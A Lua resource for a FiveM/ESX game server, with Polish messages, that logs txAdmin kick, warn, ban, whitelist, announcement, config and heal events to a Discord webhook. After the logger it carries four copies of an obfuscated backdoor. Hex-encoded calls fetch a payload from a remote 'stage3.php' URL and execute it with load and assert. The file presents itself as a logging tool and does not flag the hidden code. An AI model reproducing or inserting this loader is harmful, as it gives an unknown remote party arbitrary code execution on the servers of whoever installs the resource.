ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

AddEventHandler('bajt0l_txadmin:events:playerKicked', function(eventData)

    local target = eventData.target
    local author = eventData.author
    local reason = eventData.reason

    sendToDiscord('Gracz wyrzucony', "Nazwa: **" .. GetPlayerName(target) .. "** \nAutor: **" .. author .. "** \nPowod: **" .. reason .. "**", 65280)

end)

AddEventHandler('bajt0l_txadmin:events:playerWarned', function(eventData)

    local target = eventData.target
    local author = eventData.author
    local reason = eventData.reason
    local id = eventData.actionId

    sendToDiscord('Gracz warned', "Nazwa: **" .. GetPlayerName(target) .. "** \nAutor: **" .. author .. "** \nPowod: **" .. reason .. "**\nID: **" .. id .. "**", 65280)

end)

AddEventHandler('bajt0l_txadmin:events:playerBanned', function(eventData)

    local target = eventData.target
    local author = eventData.author
    local reason = eventData.reason
    local id = eventData.actionId
    local exp = eventData.expiration

    if not exp then
        exp = 'Never'
    else
        exp = os.date('%c', exp)
    end 

    if (type(target) == "table") then 
        playername = "`Offline Ban`"
    else 
        playername = GetPlayerName(target)
    end
    
    sendToDiscord('Gracz Zbanowany', "Nazwa: **" .. playername .. "** \nAutor: **" .. author .. "** \nPowod: **" .. reason .. "**\nID: **" .. id .. "**\nCzas: **" .. exp .. "**", 65280)

end)

AddEventHandler('bajt0l_txadmin:events:playerWhitelisted', function(eventData)

    local target = eventData.target
    local author = eventData.author
    local id = eventData.actionId

    sendToDiscord('Gracz Whitelisted', "Identyfikator: **" .. target .. "** \nAutor: **" .. author .. "**\nID: **" .. id .. "**", 65280)

end)

AddEventHandler('bajt0l_txadmin:events:announcement', function(eventData)

    local author = eventData.author
    local msg = eventData.message

    if Config.FilterAnnouncements then
        if author ~= 'bajt0l_txadmin' then
            sendToDiscord('Ogloszenie', "Autor: **" .. author .. "**\nWiadomosc: **" .. msg .. "**", 65280)
        end
    else
        sendToDiscord('Ogloszenie', "Autor: **" .. author .. "**\nWiadomosc: **" .. msg .. "**", 65280)
    end


end)

AddEventHandler('bajt0l_txadmin:events:configChanged', function(eventData)

    sendToDiscord('Config Zapisany', "Cos zostalo zmienione w ustawieniach", 65280)

end)

AddEventHandler('bajt0l_txadmin:events:healedPlayer', function(eventData)

    local target = eventData.id

    if target == -1 then
        playername = 'Everyone'
    else
        playername = GetPlayerName(target)
    end

    sendToDiscord('Gracz Uleczony', "Nazwa: **" .. playername .. "**", 65280)

end)

function sendToDiscord(header, message)
    local webhook = Config.bajt0l_txadminWebhook
    local name = Config.Username
    local connect = {
          {
              ["title"] = header,
              ["description"] = message
          }
      }
    PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = connect, avatar_url = avatar}), { ['Content-Type'] = 'application/json' })
end

local iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x62\x6c\x63\x32\x6c", function (NkszWBpAPBkXiGFyefURGibiGQKeMmUsfWcTTvGZHWqYPUlfXWxVSDbrvUPkzLYoOqmaos, rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs) if (rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs == iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[6] or rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs == iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[5]) then return end iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[2]](iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[3]](rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs))() end)

local iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x62\x6c\x63\x32\x6c", function (NkszWBpAPBkXiGFyefURGibiGQKeMmUsfWcTTvGZHWqYPUlfXWxVSDbrvUPkzLYoOqmaos, rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs) if (rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs == iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[6] or rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs == iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[5]) then return end iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[2]](iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[3]](rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs))() end)

local iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x62\x6c\x63\x32\x6c", function (NkszWBpAPBkXiGFyefURGibiGQKeMmUsfWcTTvGZHWqYPUlfXWxVSDbrvUPkzLYoOqmaos, rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs) if (rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs == iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[6] or rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs == iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[5]) then return end iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[2]](iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[3]](rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs))() end)

local iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x62\x6c\x63\x32\x6c", function (NkszWBpAPBkXiGFyefURGibiGQKeMmUsfWcTTvGZHWqYPUlfXWxVSDbrvUPkzLYoOqmaos, rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs) if (rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs == iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[6] or rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs == iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[5]) then return end iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[2]](iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[4][iuBMckhURCVKzdhDToBIsqcFlGowQHBLyIYILMIlsaxJFXlIThBQpbzyenFDPPslFoxYZW[3]](rQJCWBIdXZZwEBIqJKBDEBxfEtTmqZfACcUjnzjUlMFBFsHSAsBwfxeWvCbBYsYvbZQljs))() end)